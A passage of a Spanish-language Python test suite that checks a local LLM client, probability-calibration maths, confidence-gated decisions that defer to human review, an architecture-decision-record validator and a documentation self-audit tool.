        with mock.patch.object(sys, "argv", ["jev_llama.py", "--input", str(input_file)]), \
             mock.patch.object(self.jl, "JevLlama", return_value=self._client()), \
             mock.patch.object(sys, "stdout", io.StringIO()):
            result = self.jl._main()
            self.assertEqual(result, 0)

    def test_main_uso_incorrecto(self):
        with mock.patch.object(sys, "argv", ["jev_llama.py"]), \
             mock.patch.object(sys, "stderr", io.StringIO()):
            result = self.jl._main()
            self.assertEqual(result, 1)

    def test_main_input_falta_archivo(self):
        with mock.patch.object(sys, "argv", ["jev_llama.py", "--input"]), \
             mock.patch.object(sys, "stderr", io.StringIO()):
            result = self.jl._main()
            self.assertEqual(result, 1)


class TestJevCalibration(unittest.TestCase):
    """REQ-011: matematicas de calibracion (NLL/Brier/ECE/temperatura)."""

    def test_softmax_normaliza_y_temperatura(self):
        p1 = jc.softmax([1.0, 1.0], 1.0)
        self.assertAlmostEqual(sum(p1), 1.0, places=9)
        self.assertAlmostEqual(p1[0], 0.5, places=9)
        with self.assertRaises(ValueError):
            jc.softmax([1.0], 0.0)

    def test_temperature_scale_suaviza_sin_cambiar_argmax(self):
        base = [0.9, 0.07, 0.03]
        scaled = jc.temperature_scale(base, 3.0)
        self.assertAlmostEqual(sum(scaled), 1.0, places=9)
        self.assertEqual(base.index(max(base)), scaled.index(max(scaled)))
        self.assertLess(max(scaled), max(base))

    def test_brier_y_nll_valores_conocidos(self):
        self.assertAlmostEqual(jc.brier([1.0, 0.0], 0), 0.0, places=12)
        self.assertAlmostEqual(jc.nll([1.0, 0.0], 0), 0.0, places=6)
        self.assertAlmostEqual(jc.brier([0.5, 0.5], 1), 0.5, places=12)
        self.assertAlmostEqual(jc.nll([0.5, 0.5], 1), math.log(2), places=6)

    def test_accuracy(self):
        probs = [[0.9, 0.1], [0.2, 0.8], [0.6, 0.4]]
        self.assertAlmostEqual(jc._accuracy(probs, [0, 1, 1]), 2 / 3, places=9)

    def test_wilson_ci(self):
        lo, hi = jc.wilson_ci(8, 10)
        self.assertLess(lo, 0.8)
        self.assertGreater(hi, 0.8)
        self.assertEqual(jc.wilson_ci(0, 0), (0.0, 0.0))

    def test_evaluate_incluye_ci(self):
        records = [{"probs": [0.9, 0.1], "label_idx": 0}, {"probs": [0.2, 0.8], "label_idx": 0}]
        metricas = jc.evaluate(records, 1.0)
        self.assertIn("accuracy_ci95", metricas)
        self.assertEqual(len(metricas["accuracy_ci95"]), 2)

    def test_ece_adaptativo(self):
        self.assertAlmostEqual(jc.ece([[1.0, 0.0], [1.0, 0.0]], [0, 0], adaptativo=True), 0.0, places=9)
        mixto = [[0.9, 0.1], [0.6, 0.4], [0.2, 0.8], [0.5, 0.5]]
        valor = jc.ece(mixto, [0, 0, 0, 1], adaptativo=True)
        self.assertGreaterEqual(valor, 0.0)
        self.assertLessEqual(valor, 1.0)
        self.assertIn("ece_adaptativo", jc.evaluate(
            [{"probs": [0.9, 0.1], "label_idx": 0}], 1.0))

    def test_run_cases_cache(self):
        class _Fake:
            def __init__(self):
                self.model_path = Path("m.gguf")
                self.llamadas = 0

            def decide(self, state, questions):
                self.llamadas += 1
                return {"q": {"probabilities": {"yes": 0.6, "no": 0.4}}}

        caso = {"id": "N01", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "yes"}
        fake, cache = _Fake(), {}
        jc.run_cases(fake, [caso], cache)
        jc.run_cases(fake, [caso], cache)
        self.assertEqual(fake.llamadas, 1)

    def test_sembrar_cache_desde_informe(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            informe = tmp / "r.json"
            informe.write_text(json.dumps({
                "modelo": "m.gguf",
                "records": [{"id": "N01", "probs": [0.6, 0.4], "label_idx": 0}],
            }), encoding="utf-8")
            cache: dict = {}
            self.assertEqual(jc.sembrar_cache_desde_informe(cache, informe), 1)
            self.assertIn("m.gguf|N01", cache)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_cache_roundtrip_calibracion(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            path = tmp / "c.json"
            jc.guardar_cache({"k": 1}, path)
            self.assertEqual(jc.cargar_cache(path), {"k": 1})
            self.assertEqual(jc.cargar_cache(tmp / "no.json"), {})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_bootstrap_ci_determinista(self):
        valores = [1.0, 2.0, 3.0, 4.0]
        primero = jc.bootstrap_ci(valores)
        segundo = jc.bootstrap_ci(valores)
        self.assertEqual(primero, segundo)
        lo, hi = primero
        self.assertLessEqual(lo, hi)
        self.assertEqual(jc.bootstrap_ci([]), (0.0, 0.0))

    def test_valores_por_caso(self):
        records = [{"probs": [1.0, 0.0], "label_idx": 0}, {"probs": [0.5, 0.5], "label_idx": 1}]
        nlls, briers = jc._valores_por_caso(records, 1.0)
        self.assertEqual(len(nlls), 2)
        self.assertEqual(len(briers), 2)
        self.assertAlmostEqual(briers[0], 0.0, places=9)

    def test_ece_valor_conocido(self):
        probs = [[0.9, 0.1], [0.9, 0.1]]
        self.assertAlmostEqual(jc.ece(probs, [0, 1]), 0.4, places=9)
        self.assertAlmostEqual(jc.ece([], []), 0.0, places=9)

    def test_fit_temperature_corrige_overconfidence(self):
        # accuracy 0.5 con confianza 0.98 => T > 1 reduce el NLL.
        probs = [[0.98, 0.02], [0.98, 0.02], [0.98, 0.02], [0.98, 0.02]]
        records = [{"probs": p, "label_idx": y} for p, y in zip(probs, [0, 1, 0, 1])]
        t = jc.fit_temperature(records)
        self.assertGreater(t, 1.0)
        self.assertLess(jc.evaluate(records, t)["nll"], jc.evaluate(records, 1.0)["nll"])

    def test_load_set_y_validacion(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            good = tmp / "s.json"
            good.write_text(json.dumps({"casos": [
                {"id": "X1", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "yes"}
            ]}), encoding="utf-8")
            casos = jc.load_set(good)
            self.assertEqual(len(casos), 1)
            self.assertEqual(jc._options_and_label(casos[0]), (["yes", "no"], 0))

            bad = tmp / "b.json"
            bad.write_text(json.dumps({"casos": [
                {"id": "X2", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "quizas"}
            ]}), encoding="utf-8")
            with self.assertRaises(ValueError):
                jc._options_and_label(jc.load_set(bad)[0])
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_temperature_scale_invalida(self):
        with self.assertRaises(ValueError):
            jc.temperature_scale([0.5, 0.5], 0)

    def test_accuracy_y_evaluate_vacios(self):
        self.assertEqual(jc._accuracy([], []), 0.0)
        self.assertEqual(jc.evaluate([], 1.0)["n"], 0)

    def test_kfold_folds_invalidos(self):
        with self.assertRaises(ValueError):
            jc.kfold([{"probs": [0.6, 0.4], "label_idx": 0}], 1)

    def test_question_y_options(self):
        self.assertEqual(
            jc._question({"id": "N1", "tipo": "noul", "instrucciones": "i"})["type"], "noul"
        )
        self.assertEqual(
            jc._question({"id": "C1", "tipo": "choice", "instrucciones": "i",
                          "criterios": {"a": "A"}})["criteria"], {"a": "A"})
        self.assertEqual(
            jc._question({"id": "S1", "tipo": "score", "instrucciones": "i",
                          "niveles": ["x", "y"]})["criteria"], ["x", "y"])
        with self.assertRaises(ValueError):
            jc._question({"id": "Z1", "tipo": "raro", "instrucciones": "i"})
        self.assertEqual(
            jc._options_and_label({"id": "C1", "tipo": "choice", "esperado": "a",
                                   "criterios": {"a": "A", "b": "B"}}), (["a", "b"], 0))
        self.assertEqual(
            jc._options_and_label({"id": "S1", "tipo": "score", "esperado": "1",
                                   "niveles": ["x", "y"]}), (["0", "1"], 1))

    def test_cargar_cache_json_invalido(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            ruta = tmp / "c.json"
            ruta.write_text("{no json", encoding="utf-8")
            self.assertEqual(jc.cargar_cache(ruta), {})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_sembrar_cache_ausente_e_invalido(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            self.assertEqual(jc.sembrar_cache_desde_informe({}, tmp / "no.json"), 0)
            malo = tmp / "malo.json"
            malo.write_text("{no json", encoding="utf-8")
            self.assertEqual(jc.sembrar_cache_desde_informe({}, malo), 0)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_por_tipo_y_print_human(self):
        report = jc.calibrate(_FakeCalibClient(), _casos_calibracion(), folds=2)
        self.assertIn("noul", jc._por_tipo(report["records"], 1.0))
        buf = io.StringIO()
        with mock.patch.object(sys, "stdout", buf):
            jc._print_human(report)
        self.assertIn("T recomendada", buf.getvalue())

    def test_main_json_y_write(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            set_path = tmp / "set.json"
            set_path.write_text(json.dumps({"casos": _casos_calibracion()}), encoding="utf-8")
            argv = ["jev_calibration.py", "--set", str(set_path), "--folds", "2",
                    "--no-cache", "--json", "--write"]
            with mock.patch.object(jc, "JevLlama", lambda model_path=None: _FakeCalibClient()), \
                    mock.patch.object(jc, "DEFAULT_REPORT", tmp / "r.json"), \
                    mock.patch.object(sys, "argv", argv), \
                    mock.patch.object(sys, "stdout", io.StringIO()), \
                    mock.patch.object(sys, "stderr", io.StringIO()):
                self.assertEqual(jc.main(), 0)
            self.assertTrue((tmp / "r.json").exists())
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_softmax_temperature_invalida(self):
        with self.assertRaises(ValueError):
            jc.softmax([1.0, 1.0], 0.0)
        with self.assertRaises(ValueError):
            jc.softmax([1.0, 1.0], -1.0)

    def test_temperature_scale_temperature_invalida(self):
        with self.assertRaises(ValueError):
            jc.temperature_scale([0.5, 0.5], 0.0)
        with self.assertRaises(ValueError):
            jc.temperature_scale([0.5, 0.5], -1.0)

    def test_fit_temperature_empate_cerca_de_1(self):
        # Cuando dos temperaturas tienen NLL muy similar, se elige la mas cercana a 1.0
        records = [{"probs": [0.6, 0.4], "label_idx": 0}] * 10
        # T=1.0 y T=1.1 pueden tener NLL similar
        t = jc.fit_temperature(records, grid=[1.0, 1.1])
        self.assertIn(t, [1.0, 1.1])

    def test_fit_temperature_grid_personalizado(self):
        records = [{"probs": [0.9, 0.1], "label_idx": 0}] * 5
        t = jc.fit_temperature(records, grid=[0.5, 1.0, 2.0])
        self.assertIn(t, [0.5, 1.0, 2.0])

    def test_kfold_con_seed_determinista(self):
        records = [{"probs": [0.6, 0.4], "label_idx": i % 2} for i in range(10)]
        r1 = jc.kfold(records, folds=2, seed=42)
        r2 = jc.kfold(records, folds=2, seed=42)
        self.assertEqual(r1["T_media"], r2["T_media"])
        self.assertEqual(r1["T_min"], r2["T_min"])
        self.assertEqual(r1["T_max"], r2["T_max"])

    def test_kfold_folds_igual_a_n(self):
        records = [{"probs": [0.6, 0.4], "label_idx": 0}] * 3
        result = jc.kfold(records, folds=3)
        self.assertEqual(result["folds"], 3)

    def test_evaluate_confianza_media(self):
        records = [{"probs": [0.9, 0.1], "label_idx": 0}, {"probs": [0.6, 0.4], "label_idx": 1}]
        m = jc.evaluate(records, 1.0)
        self.assertIn("confianza_media", m)
        self.assertAlmostEqual(m["confianza_media"], (0.9 + 0.6) / 2, places=9)

    def test_por_tipo_vacio(self):
        self.assertEqual(jc._por_tipo([], 1.0), {})

    def test_valores_por_caso_vacio(self):
        nlls, briers = jc._valores_por_caso([], 1.0)
        self.assertEqual(nlls, [])
        self.assertEqual(briers, [])

    def test_bootstrap_ci_n_pequeno(self):
        valores = [1.0, 2.0, 3.0]
        lo, hi = jc.bootstrap_ci(valores, n=10)
        self.assertLessEqual(lo, hi)

    def test_calibrate_sin_cache(self):
        client = _FakeCalibClient()
        report = jc.calibrate(client, _casos_calibracion(), folds=2, cache=None)
        self.assertIn("T_recomendada", report)
        self.assertIn("records", report)

    def test_calibrate_con_cache_vacio(self):
        client = _FakeCalibClient()
        cache = {}
        report = jc.calibrate(client, _casos_calibracion(), folds=2, cache=cache)
        self.assertIn("T_recomendada", report)
        self.assertGreater(len(cache), 0)

    def test_main_sin_write(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            set_path = tmp / "set.json"
            set_path.write_text(json.dumps({"casos": _casos_calibracion()}), encoding="utf-8")
            argv = ["jev_calibration.py", "--set", str(set_path), "--folds", "2", "--no-cache"]
            with mock.patch.object(jc, "JevLlama", lambda model_path=None: _FakeCalibClient()), \
                    mock.patch.object(sys, "argv", argv), \
                    mock.patch.object(sys, "stdout", io.StringIO()), \
                    mock.patch.object(sys, "stderr", io.StringIO()):
                self.assertEqual(jc.main(), 0)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_main_model_desde_arg(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            set_path = tmp / "set.json"
            set_path.write_text(json.dumps({"casos": _casos_calibracion()}), encoding="utf-8")
            argv = ["jev_calibration.py", "--set", str(set_path), "--folds", "2", "--no-cache", "--model", "/custom/model.gguf"]
            with mock.patch.object(jc, "JevLlama") as mock_llama, \
                    mock.patch.object(sys, "argv", argv), \
                    mock.patch.object(sys, "stdout", io.StringIO()), \
                    mock.patch.object(sys, "stderr", io.StringIO()):
                mock_llama.return_value = _FakeCalibClient()
                self.assertEqual(jc.main(), 0)
                mock_llama.assert_called_once_with(model_path="/custom/model.gguf")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_main_no_cache_flag(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            set_path = tmp / "set.json"
            set_path.write_text(json.dumps({"casos": _casos_calibracion()}), encoding="utf-8")
            argv = ["jev_calibration.py", "--set", str(set_path), "--folds", "2", "--no-cache"]
            with mock.patch.object(jc, "JevLlama", lambda model_path=None: _FakeCalibClient()), \
                    mock.patch.object(jc, "cargar_cache") as mock_cache, \
                    mock.patch.object(sys, "argv", argv), \
                    mock.patch.object(sys, "stdout", io.StringIO()), \
                    mock.patch.object(sys, "stderr", io.StringIO()):
                self.assertEqual(jc.main(), 0)
                mock_cache.assert_not_called()
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class _FakeCalibClient:
    """Cliente simulado para calibracion (REQ-011), sin modelo."""

    def __init__(self):
        self.model_path = Path("fake.gguf")

    def decide(self, state, questions):
        q = questions["q"]
        tipo = q["type"]
        if tipo == "noul":
            probs = {"yes": 0.8, "no": 0.2}
        elif tipo == "choice":
            claves = list(q["criteria"])
            probs = {k: (0.8 if i == 0 else 0.2 / max(1, len(claves) - 1))
                     for i, k in enumerate(claves)}
        else:
            n = len(q["criteria"])
            probs = {str(i): (0.8 if i == 0 else 0.2 / max(1, n - 1)) for i in range(n)}
        return {"q": {"type": tipo, "probabilities": probs, "confidence": 0.8}}


def _casos_calibracion():
    return [
        {"id": "N01", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "yes"},
        {"id": "C01", "tipo": "choice", "estado": "e", "instrucciones": "i",
         "criterios": {"a": "A", "b": "B"}, "esperado": "a"},
        {"id": "S01", "tipo": "score", "estado": "e", "instrucciones": "i",
         "niveles": ["x", "y"], "esperado": "1"},
    ]


class _FakeJevClient:
    """Cliente Jev simulado para REQ-012: probabilidades fijas, sin modelo."""

    def __init__(self, confianza: float = 0.6):
        self.confianza = confianza

    def decide(self, state, questions):
        respuestas = {}
        for campo, question in questions.items():
            if question["type"] == "choice":
                opciones = list(question["criteria"])
                ganador = opciones[-1]
                probs = {
                    o: (0.7 if o == ganador else 0.3 / (len(opciones) - 1)) for o in opciones
                }
                respuestas[campo] = {
                    "type": "choice",
                    "choice": ganador,
                    "probabilities": probs,
                    "confidence": self.confianza,
                }
            else:
                probs = {str(i): [0.05, 0.1, 0.7, 0.15][i] for i in range(4)}
                respuestas[campo] = {
                    "type": "score",
                    "score": 2.0,
                    "probabilities": probs,
                    "confidence": self.confianza,
                }
        return respuestas


class TestJevPillars(unittest.TestCase):
    """REQ-012: integracion de Jev con los tres pilares (sin modelo)."""

    ACC = {"choice": 0.9167, "score": 0.4167}

    @staticmethod
    def _ns(req=None, lesson_id=None, file=None, text=None):
        return argparse.Namespace(req=req, id=lesson_id, file=file, text=text)

    def test_requisitos_esquema_y_decision(self):
        salida = jp.ejecutar("requisitos", "REQ-011", "texto", _FakeJevClient(), 0.5, self.ACC)
        self.assertEqual(salida["tipo"], "choice")
        self.assertFalse(salida["experimental"])
        decision = salida["decisiones"][0]
        self.assertEqual(
            set(decision),
            {
                "id",
                "campo",
                "tipo",
                "decision",
                "propuesta",
                "probabilities",
                "confidence",
                "revision_humana",
                "accuracy_referencia",
                "experimental",
            },
        )
        self.assertEqual(decision["campo"], "prioridad")
        self.assertEqual(decision["decision"], "Alta")
        self.assertAlmostEqual(sum(decision["probabilities"].values()), 1.0, places=6)

    def test_conocimiento_score_marca_experimental(self):
        salida = jp.ejecutar("conocimiento", "frag", "texto", _FakeJevClient(), 0.5, self.ACC)
        self.assertEqual(salida["tipo"], "score")
        # accuracy score 0.417 < 0.6 => experimental (criterio 6).
        self.assertTrue(salida["experimental"])
        decision = salida["decisiones"][0]
        self.assertTrue(decision["experimental"])
        # P0.20/P1.31: experimental => nunca decision autoritativa, exige revision.
        self.assertIsNone(decision["decision"])
        self.assertTrue(decision["revision_humana"])

    def test_lecciones_dos_decisiones(self):
        salida = jp.ejecutar("lecciones", "LSN-008", "texto", _FakeJevClient(), 0.5, self.ACC)
        campos = [d["campo"] for d in salida["decisiones"]]
        self.assertEqual(campos, ["fase", "categoria"])
        self.assertFalse(salida["experimental"])

    def test_umbral_marca_revision_humana_y_decision_nula(self):
        salida = jp.ejecutar("requisitos", "REQ-011", "texto", _FakeJevClient(0.4), 0.5, self.ACC)
        decision = salida["decisiones"][0]
        self.assertIsNone(decision["decision"])
        self.assertEqual(decision["propuesta"], "Alta")
        self.assertTrue(decision["revision_humana"])

    def test_umbral_limite_es_definitivo(self):
        salida = jp.ejecutar("requisitos", "REQ-011", "texto", _FakeJevClient(0.5), 0.5, self.ACC)
        decision = salida["decisiones"][0]
        self.assertFalse(decision["revision_humana"])
        self.assertEqual(decision["decision"], "Alta")

    def test_accuracy_desconocida_es_experimental(self):
        salida = jp.ejecutar("requisitos", "REQ-011", "texto", _FakeJevClient(), 0.5, {})
        self.assertIsNone(salida["accuracy_referencia"])
        self.assertTrue(salida["experimental"])
        # sin accuracy de referencia, tampoco decide: solo propone (P1.19).
        self.assertIsNone(salida["decisiones"][0]["decision"])
        self.assertTrue(salida["decisiones"][0]["revision_humana"])

    def test_pilar_desconocido_lanza(self):
        with self.assertRaises(ValueError):
            jp.ejecutar("otro", "X", "texto", _FakeJevClient(), 0.5, self.ACC)

    def test_accuracy_por_tipo_lee_informe(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            report = tmp / "cal.json"
            report.write_text(
                json.dumps(
                    {"por_tipo_Trecomendada": {"choice": {"accuracy": 0.9}, "score": {"accuracy": 0.4}}}
                ),
                encoding="utf-8",
            )
            self.assertEqual(
                jp.accuracy_por_tipo(report), {"choice": 0.9, "score": 0.4}
            )
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_accuracy_por_tipo_sin_informe(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            self.assertEqual(jp.accuracy_por_tipo(tmp / "no_existe.json"), {})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_accuracy_por_tipo_informe_invalido(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            report = tmp / "roto.json"
            report.write_text("{no json", encoding="utf-8")
            with self.assertRaises(ValueError):
                jp.accuracy_por_tipo(report)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_resolver_entrada_exige_opcion_unica(self):
        with self.assertRaises(ValueError):
            jp.resolver_entrada("requisitos", self._ns())
        with self.assertRaises(ValueError):
            jp.resolver_entrada("requisitos", self._ns(req="REQ-011", text="hola"))
        with self.assertRaises(ValueError):
            jp.resolver_entrada("conocimiento", self._ns(lesson_id="LSN-001"))
        with self.assertRaises(ValueError):
            jp.resolver_entrada("lecciones", self._ns())

    def test_resolver_entrada_texto(self):
        entry_id, texto = jp.resolver_entrada("conocimiento", self._ns(text="fragmento"))
        self.assertEqual((entry_id, texto), ("texto", "fragmento"))

    def test_resolver_entrada_lecciones_por_id(self):
        entry_id, texto = jp.resolver_entrada("lecciones", self._ns(lesson_id="LSN-001"))
        self.assertEqual(entry_id, "LSN-001")
        self.assertIn("Problema:", texto)

    def test_texto_desde_archivo_requisitos_no_filtra_prioridad(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            path = tmp / "REQ-999.md"
            path.write_text(
                "---\nid: REQ-999\nprioridad: Alta\n---\n# REQ-999\nCuerpo del requisito.\n",
                encoding="utf-8",
            )
            _, texto = jp._texto_desde_archivo(path, "requisitos")
            self.assertNotIn("prioridad", texto)
            self.assertIn("Cuerpo del requisito.", texto)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_strip_frontmatter(self):
        self.assertEqual(jp._strip_frontmatter("---\na: 1\n---\ncuerpo"), "cuerpo")
        self.assertEqual(jp._strip_frontmatter("sin frontmatter"), "sin frontmatter")

    def test_leer_requisito_ausente(self):
        with self.assertRaises(FileNotFoundError):
            jp._leer_requisito("REQ-999")

    def test_buscar_leccion_ok_y_ausente(self):
        self.assertEqual(str(jp._buscar_leccion("LSN-001").get("id")), "LSN-001")
        with self.assertRaises(ValueError):
            jp._buscar_leccion("LSN-999")

    def test_texto_leccion(self):
        self.assertIn("Problema: p", jp._texto_leccion({"problema": "p", "recomendacion": "r"}))

    def test_texto_desde_archivo_lecciones_y_plano(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            yaml_list = tmp / "l.yaml"
            yaml_list.write_text(
                "- id: LSN-001\n  problema: p\n  recomendacion: r\n", encoding="utf-8"
            )
            _, texto = jp._texto_desde_archivo(yaml_list, "lecciones")
            self.assertIn("Problema: p", texto)
            plano = tmp / "k.md"
            plano.write_text("contenido plano", encoding="utf-8")
            _, texto2 = jp._texto_desde_archivo(plano, "conocimiento")
            self.assertEqual(texto2, "contenido plano")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_resolver_entrada_todas_las_vias(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            archivo = tmp / "f.md"
            archivo.write_text("texto archivo", encoding="utf-8")
            self.assertEqual(jp.resolver_entrada("requisitos", self._ns(req="REQ-011"))[0], "REQ-011")
            self.assertEqual(
                jp.resolver_entrada("requisitos", self._ns(file=str(archivo)))[1], "texto archivo"
            )
            self.assertEqual(jp.resolver_entrada("requisitos", self._ns(text="x"))[1], "x")
            self.assertEqual(
                jp.resolver_entrada("conocimiento", self._ns(file=str(archivo)))[1], "texto archivo"
            )
            self.assertEqual(jp.resolver_entrada("lecciones", self._ns(text="x"))[1], "x")
            with self.assertRaises(ValueError):
                jp.resolver_entrada("otro", self._ns(text="x"))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_print_human(self):
        salida = jp.ejecutar("requisitos", "REQ-011", "texto", _FakeJevClient(), 0.5, self.ACC)
        buf = io.StringIO()
        with mock.patch.object(sys, "stdout", buf):
            jp._print_human(salida)
        self.assertIn("Pilar: requisitos", buf.getvalue())

    def test_main_json_y_error(self):
        buf = io.StringIO()
        with mock.patch.object(jp, "JevLlama", lambda model_path=None: _FakeJevClient()), \
                mock.patch.object(jp, "accuracy_por_tipo", return_value=self.ACC), \
                mock.patch.object(sys, "stdout", buf):
            self.assertEqual(jp.main(["conocimiento", "--text", "x", "--json"]), 0)
        self.assertIn("experimental", buf.getvalue())
        with mock.patch.object(sys, "stderr", io.StringIO()):
            self.assertEqual(jp.main(["requisitos"]), 1)


class TestADRValidator(unittest.TestCase):
    """REQ-013: validacion de ADR y auditoria de sesgos (Pilar 4)."""

    ADR_VALIDO = (
        "---\nid: ADR-100\ntitulo: Prueba\nestado: Aceptado\nfecha: 2026-09-19\n---\n"
        "# ADR-100: Prueba\n\n## Contexto\n\nProblema con 3 GB de datos.\n\n"
        "## Alternativas consideradas\n\n- **A**: opcion 1.\n- **B**: opcion 2.\n\n"
        "## Decision\n\nSe elige A por 2 razones.\n\n"
        "## Consecuencias\n\n- Positivas: 1.\n\n"
        "## Supuestos\n\n- Vale 1.\n\n"
        "## Metricas de exito\n\n- p99 < 200 ms.\n\n"
        "## Pre-mortem (Analisis Prospectivo de Fallos)\n\n- Escenario 1: fallo X, mitigacion Y.\n- Escenario 2: fallo Z, mitigacion W.\n"
    )

    tmp: Path

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _adr(self, content: str, name: str = "ADR-100-prueba.md") -> Path:
        path = self.tmp / name
        path.write_text(content, encoding="utf-8")
        return path

    def test_repo_real_sin_errores(self):
        errors, warnings = av.validate(ROOT / "docs" / "decisions")
        self.assertEqual(errors, [])
        self.assertEqual(warnings, [])

    def test_adr_valido_temporal(self):
        self._adr(self.ADR_VALIDO)
        errors, warnings = av.validate(self.tmp)
        self.assertEqual(errors, [])
        self.assertEqual(warnings, [])

    def test_sin_frontmatter_es_error(self):
        self._adr("# sin frontmatter\n")
        errors, _ = av.validate(self.tmp)
        self.assertTrue(any("frontmatter" in e for e in errors))

    def test_falta_seccion_es_error(self):
        self._adr(self.ADR_VALIDO.replace("## Consecuencias\n\n- Positivas: 1.\n", ""))
        errors, _ = av.validate(self.tmp)
        self.assertTrue(any("consecuencias" in e.lower() for e in errors))

    def test_id_no_coincide_es_error(self):
        self._adr(self.ADR_VALIDO.replace("id: ADR-100", "id: ADR-999"))
        errors, _ = av.validate(self.tmp)
        self.assertTrue(any("no coincide" in e for e in errors))

    def test_estado_invalido_es_error(self):
        self._adr(self.ADR_VALIDO.replace("estado: Aceptado", "estado: Quizas"))
        errors, _ = av.validate(self.tmp)
        self.assertTrue(any("estado" in e for e in errors))

    def test_fecha_invalida_es_error(self):
        self._adr(self.ADR_VALIDO.replace("fecha: 2026-09-19", "fecha: 19-09-2026"))
        errors, _ = av.validate(self.tmp)
        self.assertTrue(any("fecha" in e for e in errors))

    def test_id_duplicado_es_error(self):
        self._adr(self.ADR_VALIDO, name="ADR-100-a.md")
        self._adr(self.ADR_VALIDO, name="ADR-100-b.md")
        errors, _ = av.validate(self.tmp)
        self.assertTrue(any("duplicado" in e for e in errors))

    def test_una_alternativa_alerta(self):
        self._adr(self.ADR_VALIDO.replace("- **B**: opcion 2.\n", ""))
        _, warnings = av.validate(self.tmp)
        self.assertTrue(any("alternativas" in w for w in warnings))

    def test_adjetivo_sin_metrica_alerta(self):
        self._adr(self.ADR_VALIDO.replace("Problema con 3 GB de datos.", "El sistema es escalable."))
        _, warnings = av.validate(self.tmp)
        self.assertTrue(any("escalable" in w for w in warnings))

    def test_sin_adjetivo_en_contexto_no_alerta(self):
        # Sin adjetivo ambiguo ni metrica en Contexto no debe haber alerta (mata
        # el mutante and->or de la linea 128).
        self._adr(self.ADR_VALIDO.replace("Problema con 3 GB de datos.", "Problema sencillo."))
        _, warnings = av.validate(self.tmp)
        self.assertEqual(warnings, [])

    def test_afirmacion_absoluta_alerta(self):
        self._adr(self.ADR_VALIDO.replace("Se elige A por 2 razones.", "Esto siempre funciona."))
        _, warnings = av.validate(self.tmp)
        self.assertTrue(any("siempre" in w for w in warnings))

    def test_strict_falla_con_alertas(self):
        self._adr(self.ADR_VALIDO.replace("- **B**: opcion 2.\n", ""))
        self.assertEqual(av.main(["--dir", str(self.tmp), "--strict"]), 1)
        self.assertEqual(av.main(["--dir", str(self.tmp)]), 0)

    def test_dir_inexistente_falla(self):
        self.assertEqual(av.main(["--dir", str(self.tmp / "no_existe")]), 1)


class TestAutoAudit(unittest.TestCase):
    """REQ-014: auto-auditoria (sesgos, evidencias, decisiones, tests, IA)."""

    _TEST_OK = (
        "import unittest\n\n\n"
        "class T(unittest.TestCase):\n"
        "    def test_ok(self):\n"
        "        self.assertEqual(1 + 1, 2)\n"
    )

    tmp: Path

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write(self, name: str, content: str) -> Path:
        path = self.tmp / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
        return path

    def test_sesgos_detecta_garantia_absoluta(self):
        path = self._write("doc.md", "El sistema garantiza el exito total.\n")
        hallazgos = aa.auditar_sesgos([path])
        self.assertTrue(any("garantia absoluta" in h for h in hallazgos))

    def test_sesgos_ignora_lineas_de_reglas(self):
        path = self._write("doc.md", "### P0.1 Nunca afirmes sin evidencia\n")
        self.assertEqual(aa.auditar_sesgos([path]), [])

    def test_sesgos_detecta_realismo_naif(self):
        path = self._write("doc.md", "Obviamente esta es la mejor solucion.\n")
        hallazgos = aa.auditar_sesgos([path])
        self.assertTrue(any("realismo naif" in h for h in hallazgos))

    def test_evidencias_sin_sbom_es_error(self):
        errors, _ = aa.auditar_evidencias(docs_dir=self.tmp)
        self.assertTrue(any("no hay SBOM" in e for e in errors))

    def test_evidencias_sbom_antiguo_alerta(self):
        self._write("SBOM-2020-01-01.spdx.json", "{}")
        errors, warnings = aa.auditar_evidencias(docs_dir=self.tmp)
        self.assertEqual(errors, [])
        self.assertTrue(any("SBOM de" in w for w in warnings))

    def test_evidencias_sbom_reciente_ok(self):
        import datetime

        hoy = datetime.date.today().isoformat()
        self._write(f"SBOM-{hoy}.spdx.json", "{}")
        errors, warnings = aa.auditar_evidencias(docs_dir=self.tmp)
        self.assertEqual((errors, warnings), ([], []))

    def test_decisiones_req_draft(self):
        self._write("req/REQ-999.md", "---\nid: REQ-999\nestado: Draft\n---\n# x\n")
        (self.tmp / "adr").mkdir()
        warns = aa.auditar_decisiones(req_dir=self.tmp / "req", adr_dir=self.tmp / "adr")
        self.assertTrue(any("REQ-999.md" in w and "Draft" in w for w in warns))

